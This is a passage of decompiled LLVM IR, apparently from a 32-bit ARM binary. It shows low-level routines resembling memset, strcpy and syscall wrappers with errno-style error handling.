  %v3_11180 = load i32, i32* %v2_11180, align 4
  store i32 %v3_11180, i32* %r2.global-to-local, align 4
  %v4_11184 = call i32 @function_13cc4(i32 %v2_11178, i32 %v3_1117c, i32 %v3_11180, i32 %v6_1116c)
  %tmp9 = icmp slt i32 %v4_11184, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_11194

.thread:                                          ; preds = %dec_label_pc_11178
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_111c8

dec_label_pc_11194:                               ; preds = %dec_label_pc_11178
  %v1_11194 = load i32, i32* @r5, align 4
  %v2_11194 = add i32 %v1_11194, 8
  %v3_11194 = inttoptr i32 %v2_11194 to i32*
  store i32 %v4_11184, i32* %v3_11194, align 4
  %v0_11198 = load i32, i32* @r7, align 4
  %v1_11198 = load i32, i32* @r5, align 4
  %v2_11198 = add i32 %v1_11198, 4
  %v3_11198 = inttoptr i32 %v2_11198 to i32*
  store i32 %v0_11198, i32* %v3_11198, align 4
  %v0_1119c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1119c

dec_label_pc_1119c:                               ; preds = %dec_label_pc_1116c, %dec_label_pc_11194
  %v1_111ac = phi i32 [ %v0_1116c, %dec_label_pc_1116c ], [ %v0_1119c.pre, %dec_label_pc_11194 ]
  %v1_1119c = add i32 %v1_111ac, 4
  %v2_1119c = inttoptr i32 %v1_1119c to i32*
  %v3_1119c = load i32, i32* %v2_1119c, align 4
  store i32 %v3_1119c, i32* %r2.global-to-local, align 4
  %v1_111a0 = add i32 %v1_111ac, 12
  %v2_111a0 = inttoptr i32 %v1_111a0 to i32*
  %v3_111a0 = load i32, i32* %v2_111a0, align 4
  store i32 %v3_111a0, i32* %r1.global-to-local, align 4
  %v2_111a4 = add i32 %v3_111a0, %v3_1119c
  store i32 %v2_111a4, i32* @r4, align 4
  %v1_111a8 = add i32 %v2_111a4, 4
  %v2_111a8 = inttoptr i32 %v1_111a8 to i32*
  %v3_111a8 = load i32, i32* %v2_111a8, align 4
  %v2_111ac = add i32 %v1_111ac, 16
  %v3_111ac = inttoptr i32 %v2_111ac to i32*
  store i32 %v3_111a8, i32* %v3_111ac, align 4
  %v0_111b0 = load i32, i32* @r4, align 4
  %v1_111b0 = add i32 %v0_111b0, 8
  %v2_111b0 = inttoptr i32 %v1_111b0 to i16*
  %v3_111b0 = load i16, i16* %v2_111b0, align 2
  %v4_111b0 = zext i16 %v3_111b0 to i32
  %v0_111b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_111b4 = load i32, i32* %r1.global-to-local, align 4
  %v2_111b4 = add i32 %v1_111b4, %v0_111b4
  %v3_111b4 = inttoptr i32 %v2_111b4 to i32*
  %v4_111b4 = load i32, i32* %v3_111b4, align 4
  store i32 %v4_111b4, i32* %r1.global-to-local, align 4
  %v2_111b8 = add i32 %v0_111b4, %v4_111b0
  %v2_111bc = icmp eq i32 %v4_111b4, 0
  %v1_111c0 = load i32, i32* @r5, align 4
  %v2_111c0 = add i32 %v1_111c0, 4
  %v3_111c0 = inttoptr i32 %v2_111c0 to i32*
  store i32 %v2_111b8, i32* %v3_111c0, align 4
  br i1 %v2_111bc, label %dec_label_pc_1116c, label %dec_label_pc_111c8

dec_label_pc_111c8:                               ; preds = %dec_label_pc_1119c, %.thread
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_111d4 = load i32, i32* @r6, align 4
  %v2_111d4 = add i32 %v0_111d4, 24
  %v3_111d4 = inttoptr i32 %v2_111d4 to i32*
  %v4_111d4 = load i32, i32* %v3_111d4, align 4
  store i32 %v4_111d4, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_111d4)
  %v0_111e0 = load i32, i32* @r4, align 4
  store i32 %v3_1111c, i32* @r4, align 4
  store i32 %v6_1111c, i32* @r5, align 4
  store i32 %v9_1111c, i32* @r6, align 4
  store i32 %v12_1111c, i32* @r7, align 4
  store i32 %v15_1111c, i32* @lr, align 4
  ret i32 %v0_111e0

; uselistorder directives
  uselistorder i32 %v1_111ac, { 0, 2, 1 }
  uselistorder i32 %v6_1116c, { 1, 0 }
  uselistorder i32 %v0_1116c, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_1119c, { 1, 0 }
}

define i32 @function_111f4(i32 %arg1) local_unnamed_addr {
dec_label_pc_111f4:
  %v0_111f4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_111f4, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_111f4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_111f4, %bb
  %v10_11200 = phi i32 [ %arg1, %dec_label_pc_111f4 ], [ 0, %bb ]
  ret i32 %v10_11200

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_11204() local_unnamed_addr {
dec_label_pc_11204:
  store i32 124820, i32* @r3, align 4
  ret i32 ptrtoint (i32* @global_var_1ea48.354 to i32)
}

define i32 @function_11220(i32 %arg1) local_unnamed_addr {
dec_label_pc_11220:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_11224 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_11224, i32* @r0, align 4
  %v1_1122c = call i32 @function_14134(i32 %v2_11224)
  %v2_11230 = load i32, i32* %stack_var_-24, align 4
  %v2_11234 = add i32 %v2_11230, %tmp
  %v2_1123c = mul i32 %v2_11234, 10000
  %v1_11240 = and i32 %v2_1123c, 2147483632
  ret i32 %v1_11240

; uselistorder directives
  uselistorder i32 %v2_11224, { 1, 0 }
}

define i32 @function_11260(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11260:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_11264 = load i32, i32* @r2, align 4
  %v8_11264 = icmp eq i32 %v0_11264, 8
  store i1 %v8_11264, i1* %cpsr_z.global-to-local, align 1
  %v5_11268 = icmp slt i32 %v0_11264, 8
  br i1 %v5_11268, label %dec_label_pc_112c8, label %dec_label_pc_1126c

dec_label_pc_1126c:                               ; preds = %dec_label_pc_11260
  %v4_1126c = mul i32 %arg2, 256
  %v5_1126c = or i32 %v4_1126c, %arg2
  %v4_11270 = mul i32 %v5_1126c, 65536
  %v5_11270 = or i32 %v4_11270, %v5_1126c
  store i32 %v5_11270, i32* %r1.global-to-local, align 4
  %v1_1127457 = urem i32 %tmp, 4
  %v2_1127458 = icmp eq i32 %v1_1127457, 0
  store i1 %v2_1127458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_1127458, label %dec_label_pc_11284, label %bb

bb:                                               ; preds = %dec_label_pc_1126c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_1126c ]
  %v3_1127859 = phi i32 [ %v6_11278, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_1126c ]
  %v4_11278 = inttoptr i32 %v3_1127859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_11278, align 1
  %v5_11278 = load i32, i32* @r3, align 4
  %v6_11278 = add i32 %v5_11278, 1
  store i32 %v6_11278, i32* @r3, align 4
  %v0_1127c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_11288.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_1127c.pr, label %dec_label_pc_11284, label %.thread

.thread:                                          ; preds = %bb
  %v2_1127c = add i32 %v0_11288.pr.pre, -1
  store i32 %v2_1127c, i32* @r2, align 4
  %v1_11274 = urem i32 %v6_11278, 4
  %v2_11274 = icmp eq i32 %v1_11274, 0
  store i1 %v2_11274, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11274, label %dec_label_pc_11284, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_11278.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_11278.pre to i8
  br label %bb

dec_label_pc_11284:                               ; preds = %.thread, %bb, %dec_label_pc_1126c
  %v0_1129028 = phi i32 [ %tmp, %dec_label_pc_1126c ], [ %v6_11278, %bb ], [ %v6_11278, %.thread ]
  %v0_11288.pr = phi i32 [ %v0_11264, %dec_label_pc_1126c ], [ %v0_11288.pr.pre, %bb ], [ %v2_1127c, %.thread ]
  %v0_11284 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11284, i32* @ip, align 4
  %v8_1128810 = icmp eq i32 %v0_11288.pr, 8
  store i1 %v8_1128810, i1* %cpsr_z.global-to-local, align 1
  %v5_1128c11 = icmp slt i32 %v0_11288.pr, 8
  br i1 %v5_1128c11, label %dec_label_pc_112c8, label %dec_label_pc_11290.preheader

dec_label_pc_11290.preheader:                     ; preds = %dec_label_pc_11284
  %v1_1129046 = inttoptr i32 %v0_1129028 to i32*
  store i32 %v0_11284, i32* %v1_1129046, align 4
  %v3_1129047 = add i32 %v0_1129028, 4
  %v4_1129048 = inttoptr i32 %v3_1129047 to i32*
  %v5_1129049 = load i32, i32* @ip, align 4
  store i32 %v5_1129049, i32* %v4_1129048, align 4
  %v6_1129050 = add i32 %v0_1129028, 8
  store i32 %v6_1129050, i32* @r3, align 4
  %v0_1129451 = load i32, i32* @r2, align 4
  %v1_1129452 = add i32 %v0_1129451, -8
  store i32 %v1_1129452, i32* %r2.global-to-local, align 4
  %v5_1129c53 = icmp slt i32 %v1_1129452, 8
  br i1 %v5_1129c53, label %dec_label_pc_11290.dec_label_pc_112c8.loopexit_crit_edge, label %dec_label_pc_112a0

dec_label_pc_112a0:                               ; preds = %dec_label_pc_11290.preheader, %dec_label_pc_11288.dec_label_pc_11290_crit_edge
  %v6_1129055 = phi i32 [ %v6_11290, %dec_label_pc_11288.dec_label_pc_11290_crit_edge ], [ %v6_1129050, %dec_label_pc_11290.preheader ]
  %v0_1129054 = phi i32 [ %v12_112bc, %dec_label_pc_11288.dec_label_pc_11290_crit_edge ], [ %v0_1129028, %dec_label_pc_11290.preheader ]
  %v1_112a0 = inttoptr i32 %v6_1129055 to i32*
  %v2_112a0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_112a0, i32* %v1_112a0, align 4
  %v3_112a0 = add i32 %v0_1129054, 12
  %v4_112a0 = inttoptr i32 %v3_112a0 to i32*
  %v5_112a0 = load i32, i32* @ip, align 4
  store i32 %v5_112a0, i32* %v4_112a0, align 4
  %v6_112a0 = add i32 %v0_1129054, 16
  store i32 %v6_112a0, i32* @r3, align 4
  %v0_112a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_112a4 = add i32 %v0_112a4, -8
  store i32 %v1_112a4, i32* %r2.global-to-local, align 4
  %v5_112ac = icmp slt i32 %v1_112a4, 8
  br i1 %v5_112ac, label %dec_label_pc_112a0.dec_label_pc_112c8.loopexit_crit_edge, label %dec_label_pc_112b0

dec_label_pc_112b0:                               ; preds = %dec_label_pc_112a0
  %v1_112b0 = inttoptr i32 %v6_112a0 to i32*
  %v2_112b0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_112b0, i32* %v1_112b0, align 4
  %v3_112b0 = add i32 %v0_1129054, 20
  %v4_112b0 = inttoptr i32 %v3_112b0 to i32*
  %v5_112b0 = load i32, i32* @ip, align 4
  store i32 %v5_112b0, i32* %v4_112b0, align 4
  %v6_112b0 = add i32 %v0_1129054, 24
  store i32 %v6_112b0, i32* @r3, align 4
  %v0_112b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_112b4 = add i32 %v0_112b4, -8
  store i32 %v1_112b4, i32* %r2.global-to-local, align 4
  %v5_112bc = icmp slt i32 %v1_112b4, 8
  br i1 %v5_112bc, label %dec_label_pc_112b0.dec_label_pc_112c8.loopexit_crit_edge, label %dec_label_pc_11288

dec_label_pc_11288:                               ; preds = %dec_label_pc_112b0
  %v7_112bc = inttoptr i32 %v6_112b0 to i32*
  %v8_112bc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_112bc, i32* %v7_112bc, align 4
  %v9_112bc = add i32 %v0_1129054, 28
  %v10_112bc = inttoptr i32 %v9_112bc to i32*
  %v11_112bc = load i32, i32* @ip, align 4
  store i32 %v11_112bc, i32* %v10_112bc, align 4
  %v12_112bc = add i32 %v0_1129054, 32
  store i32 %v12_112bc, i32* @r3, align 4
  %v6_112c0 = load i32, i32* %r2.global-to-local, align 4
  %v7_112c0 = add i32 %v6_112c0, -8
  store i32 %v7_112c0, i32* %r2.global-to-local, align 4
  %v5_1128c = icmp slt i32 %v7_112c0, 8
  br i1 %v5_1128c, label %dec_label_pc_11288.dec_label_pc_112c8.loopexit_crit_edge, label %dec_label_pc_11288.dec_label_pc_11290_crit_edge

dec_label_pc_11288.dec_label_pc_11290_crit_edge:  ; preds = %dec_label_pc_11288
  %v2_11290.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_11290 = inttoptr i32 %v12_112bc to i32*
  store i32 %v2_11290.pre, i32* %v1_11290, align 4
  %v3_11290 = add i32 %v0_1129054, 36
  %v4_11290 = inttoptr i32 %v3_11290 to i32*
  %v5_11290 = load i32, i32* @ip, align 4
  store i32 %v5_11290, i32* %v4_11290, align 4
  %v6_11290 = add i32 %v0_1129054, 40
  store i32 %v6_11290, i32* @r3, align 4
  %v0_11294 = load i32, i32* %r2.global-to-local, align 4
  %v1_11294 = add i32 %v0_11294, -8
  store i32 %v1_11294, i32* %r2.global-to-local, align 4
  %v5_1129c = icmp slt i32 %v1_11294, 8
  br i1 %v5_1129c, label %dec_label_pc_11290.dec_label_pc_112c8.loopexit_crit_edge, label %dec_label_pc_112a0

dec_label_pc_11288.dec_label_pc_112c8.loopexit_crit_edge: ; preds = %dec_label_pc_11288
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_112c8

dec_label_pc_11290.dec_label_pc_112c8.loopexit_crit_edge: ; preds = %dec_label_pc_11288.dec_label_pc_11290_crit_edge, %dec_label_pc_11290.preheader
  %v1_11294.lcssa = phi i32 [ %v1_1129452, %dec_label_pc_11290.preheader ], [ %v1_11294, %dec_label_pc_11288.dec_label_pc_11290_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_112c8

dec_label_pc_112a0.dec_label_pc_112c8.loopexit_crit_edge: ; preds = %dec_label_pc_112a0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_112c8

dec_label_pc_112b0.dec_label_pc_112c8.loopexit_crit_edge: ; preds = %dec_label_pc_112b0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_112c8

dec_label_pc_112c8:                               ; preds = %dec_label_pc_11284, %dec_label_pc_11288.dec_label_pc_112c8.loopexit_crit_edge, %dec_label_pc_11290.dec_label_pc_112c8.loopexit_crit_edge, %dec_label_pc_112a0.dec_label_pc_112c8.loopexit_crit_edge, %dec_label_pc_112b0.dec_label_pc_112c8.loopexit_crit_edge, %dec_label_pc_11260
  %v0_112d0 = phi i32 [ %v0_11264, %dec_label_pc_11260 ], [ %v1_112b4, %dec_label_pc_112b0.dec_label_pc_112c8.loopexit_crit_edge ], [ %v1_112a4, %dec_label_pc_112a0.dec_label_pc_112c8.loopexit_crit_edge ], [ %v1_11294.lcssa, %dec_label_pc_11290.dec_label_pc_112c8.loopexit_crit_edge ], [ %v7_112c0, %dec_label_pc_11288.dec_label_pc_112c8.loopexit_crit_edge ], [ %v0_11288.pr, %dec_label_pc_11284 ]
  %v2_112c8 = icmp eq i32 %v0_112d0, 0
  store i1 %v2_112c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_112c8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_112c8
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_112c8
  %v1_112d0 = sub i32 7, %v0_112d0
  store i32 %v1_112d0, i32* %r2.global-to-local, align 4
  %v3_112d4 = mul i32 %v1_112d0, 4
  %v4_112d4 = add i32 %v3_112d4, ptrtoint (i32* @global_var_112dc.356 to i32)
  call void @__pseudo_branch(i32 %v4_112d4)
  %v0_112dc = load i32, i32* %r1.global-to-local, align 4
  %v1_112dc = trunc i32 %v0_112dc to i8
  %v2_112dc = load i32, i32* @r3, align 4
  %v3_112dc = inttoptr i32 %v2_112dc to i8*
  store i8 %v1_112dc, i8* %v3_112dc, align 1
  %v4_112dc = load i32, i32* @r3, align 4
  %v5_112dc = add i32 %v4_112dc, 1
  store i32 %v5_112dc, i32* %r3.global-to-local, align 4
  %v0_112e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_112e0 = trunc i32 %v0_112e0 to i8
  %v3_112e0 = inttoptr i32 %v5_112dc to i8*
  store i8 %v1_112e0, i8* %v3_112e0, align 1
  %v4_112e0 = load i32, i32* %r3.global-to-local, align 4
  %v5_112e0 = add i32 %v4_112e0, 1
  store i32 %v5_112e0, i32* %r3.global-to-local, align 4
  %v0_112e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_112e4 = trunc i32 %v0_112e4 to i8
  %v3_112e4 = inttoptr i32 %v5_112e0 to i8*
  store i8 %v1_112e4, i8* %v3_112e4, align 1
  %v4_112e4 = load i32, i32* %r3.global-to-local, align 4
  %v5_112e4 = add i32 %v4_112e4, 1
  store i32 %v5_112e4, i32* %r3.global-to-local, align 4
  %v0_112e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_112e8 = trunc i32 %v0_112e8 to i8
  %v3_112e8 = inttoptr i32 %v5_112e4 to i8*
  store i8 %v1_112e8, i8* %v3_112e8, align 1
  %v4_112e8 = load i32, i32* %r3.global-to-local, align 4
  %v5_112e8 = add i32 %v4_112e8, 1
  store i32 %v5_112e8, i32* %r3.global-to-local, align 4
  %v0_112ec = load i32, i32* %r1.global-to-local, align 4
  %v1_112ec = trunc i32 %v0_112ec to i8
  %v3_112ec = inttoptr i32 %v5_112e8 to i8*
  store i8 %v1_112ec, i8* %v3_112ec, align 1
  %v4_112ec = load i32, i32* %r3.global-to-local, align 4
  %v5_112ec = add i32 %v4_112ec, 1
  store i32 %v5_112ec, i32* %r3.global-to-local, align 4
  %v0_112f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_112f0 = trunc i32 %v0_112f0 to i8
  %v3_112f0 = inttoptr i32 %v5_112ec to i8*
  store i8 %v1_112f0, i8* %v3_112f0, align 1
  %v4_112f0 = load i32, i32* %r3.global-to-local, align 4
  %v5_112f0 = add i32 %v4_112f0, 1
  store i32 %v5_112f0, i32* %r3.global-to-local, align 4
  %v0_112f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_112f4 = trunc i32 %v0_112f4 to i8
  %v3_112f4 = inttoptr i32 %v5_112f0 to i8*
  store i8 %v1_112f4, i8* %v3_112f4, align 1
  %v4_112f4 = load i32, i32* %r3.global-to-local, align 4
  %v5_112f4 = add i32 %v4_112f4, 1
  store i32 %v5_112f4, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_11290, { 1, 0 }
  uselistorder i32 %v12_112bc, { 1, 2, 0 }
  uselistorder i32 %v0_1129054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_11288.pr, { 0, 2, 1 }
  uselistorder i32 %v6_11278, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_1126c, { 1, 0 }
  uselistorder i32 %v0_11264, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 1, 10, 11, 12, 13, 9, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 3, 2, 1, 4, 0, 8, 7, 5, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_112c8, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_112a0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_11300(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11300:
  %v0_11300 = call i32 @function_153b0()
  ret i32 %v0_11300
}

define i32 @function_11310() local_unnamed_addr {
dec_label_pc_11310:
  %v0_11310 = call i32 @function_153b0()
  ret i32 %v0_11310
}

define i32 @function_11320(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11320:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_113301 = load i32, i32* @r1, align 4
  %v1_113302 = inttoptr i32 %v0_113301 to i8*
  %v2_113303 = load i8, i8* %v1_113302, align 1
  %v2_113345 = icmp eq i8 %v2_113303, 0
  store i1 %v2_113345, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_113303, i8* %arg1, align 1
  br i1 %v2_113345, label %dec_label_pc_11340, label %dec_label_pc_11328

dec_label_pc_11328:                               ; preds = %dec_label_pc_11320, %dec_label_pc_11328
  %v0_11328 = load i32, i32* @r1, align 4
  %v1_11328 = add i32 %v0_11328, 1
  store i32 %v1_11328, i32* @r1, align 4
  %v0_1132c = load i32, i32* %r2.global-to-local, align 4
  %v1_1132c = add i32 %v0_1132c, 1
  store i32 %v1_1132c, i32* %r2.global-to-local, align 4
  %v1_11330 = inttoptr i32 %v1_11328 to i8*
  %v2_11330 = load i8, i8* %v1_11330, align 1
  %v2_11334 = icmp eq i8 %v2_11330, 0
  store i1 %v2_11334, i1* %cpsr_z.global-to-local, align 1
  %v3_11338 = inttoptr i32 %v1_1132c to i8*
  store i8 %v2_11330, i8* %v3_11338, align 1
  %v0_1133c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1133c, label %dec_label_pc_11340, label %dec_label_pc_11328

dec_label_pc_11340:                               ; preds = %dec_label_pc_11328, %dec_label_pc_11320
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11328, { 1, 0 }
}

define i32 @function_11344(i32 %arg1) local_unnamed_addr {
dec_label_pc_11344:
  %stack_var_-12 = alloca i32, align 4
  %v2_1134c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_1134c, i32* @r1, align 4
  %v0_11350 = call i32 @function_15c1c()
  %v2_11354 = icmp eq i32 %v0_11350, 0
  %v4_11358 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_11354, i32 -1, i32 %v4_11358
  ret i32 %storemerge
}

define i32 @function_1136c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1136c:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1136c = load i32, i32* @r7, align 4
  store i32 %v3_1136c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11394, label %dec_label_pc_11384

dec_label_pc_11384:                               ; preds = %dec_label_pc_1136c
  %v0_11384 = call i32 @function_11204()
  %v0_11388 = load i32, i32* %r7.global-to-local, align 4
  %v1_11388 = sub i32 0, %v0_11388
  %v2_1138c = inttoptr i32 %v0_11384 to i32*
  store i32 %v1_11388, i32* %v2_1138c, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_11398.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11394

dec_label_pc_11394:                               ; preds = %dec_label_pc_1136c, %dec_label_pc_11384
  %v2_11398 = phi i32 [ %v3_1136c, %dec_label_pc_1136c ], [ %v2_11398.pre, %dec_label_pc_11384 ]
  %v0_11394 = phi i32 [ %arg1, %dec_label_pc_1136c ], [ -1, %dec_label_pc_11384 ]
  store i32 %v2_11398, i32* @r7, align 4
  ret i32 %v0_11394

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11394, { 1, 0 }
}

define i32 @function_113a4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_113a4:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_113a4 = load i32, i32* @r7, align 4
  store i32 %v3_113a4, i32* %stack_var_-8, align 4
  %v0_113b0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_113b0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_113b0, -4095
  br i1 %tmp, label %dec_label_pc_113d0, label %dec_label_pc_113c0

dec_label_pc_113c0:                               ; preds = %dec_label_pc_113a4
  %v0_113c0 = call i32 @function_11204()
  %v0_113c4 = load i32, i32* %r7.global-to-local, align 4
  %v1_113c4 = sub i32 0, %v0_113c4
  %v2_113c8 = inttoptr i32 %v0_113c0 to i32*
  store i32 %v1_113c4, i32* %v2_113c8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_113d0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_113d0

dec_label_pc_113d0:                               ; preds = %dec_label_pc_113a4, %dec_label_pc_113c0
  %v1_113d4 = phi i32 [ %v0_113b0, %dec_label_pc_113a4 ], [ -1, %dec_label_pc_113c0 ]
  %v2_113d0 = phi i32 [ %v3_113a4, %dec_label_pc_113a4 ], [ %v2_113d0.pre, %dec_label_pc_113c0 ]
  store i32 %v2_113d0, i32* @r7, align 4
  ret i32 %v1_113d4

; uselistorder directives
  uselistorder i32 %v0_113b0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_113d0, { 1, 0 }
}

define i32 @function_113dc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_113dc:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_113dc = load i32, i32* @r7, align 4
  store i32 %v3_113dc, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11404, label %dec_label_pc_113f4

dec_label_pc_113f4:                               ; preds = %dec_label_pc_113dc
  %v0_113f4 = call i32 @function_11204()
  %v0_113f8 = load i32, i32* %r7.global-to-local, align 4
  %v1_113f8 = sub i32 0, %v0_113f8
  store i32 %v1_113f8, i32* @r3, align 4
  %v2_113fc = inttoptr i32 %v0_113f4 to i32*
  store i32 %v1_113f8, i32* %v2_113fc, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_11408.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11404

dec_label_pc_11404:                               ; preds = %dec_label_pc_113dc, %dec_label_pc_113f4
  %v2_11408 = phi i32 [ %v3_113dc, %dec_label_pc_113dc ], [ %v2_11408.pre, %dec_label_pc_113f4 ]
  %v0_11404 = phi i32 [ %arg1, %dec_label_pc_113dc ], [ -1, %dec_label_pc_113f4 ]
  store i32 %v2_11408, i32* @r7, align 4
  ret i32 %v0_11404

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11404, { 1, 0 }
}

define i32 @function_11414(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11414:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11414 = load i32, i32* @r7, align 4
  store i32 %v3_11414, i32* %stack_var_-8, align 4
  %v0_11420 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11420, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11420, -4095
  br i1 %tmp, label %dec_label_pc_11440, label %dec_label_pc_11430

dec_label_pc_11430:                               ; preds = %dec_label_pc_11414
  %v0_11430 = call i32 @function_11204()
  %v0_11434 = load i32, i32* %r7.global-to-local, align 4
  %v1_11434 = sub i32 0, %v0_11434
  %v2_11438 = inttoptr i32 %v0_11430 to i32*
  store i32 %v1_11434, i32* %v2_11438, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11440.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11440

dec_label_pc_11440:                               ; preds = %dec_label_pc_11414, %dec_label_pc_11430
  %v1_11444 = phi i32 [ %v0_11420, %dec_label_pc_11414 ], [ -1, %dec_label_pc_11430 ]
  %v2_11440 = phi i32 [ %v3_11414, %dec_label_pc_11414 ], [ %v2_11440.pre, %dec_label_pc_11430 ]
  store i32 %v2_11440, i32* @r7, align 4
  ret i32 %v1_11444

; uselistorder directives
  uselistorder i32 %v0_11420, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11440, { 1, 0 }
}

define i32 @function_1144c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1144c:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11480, label %dec_label_pc_11470

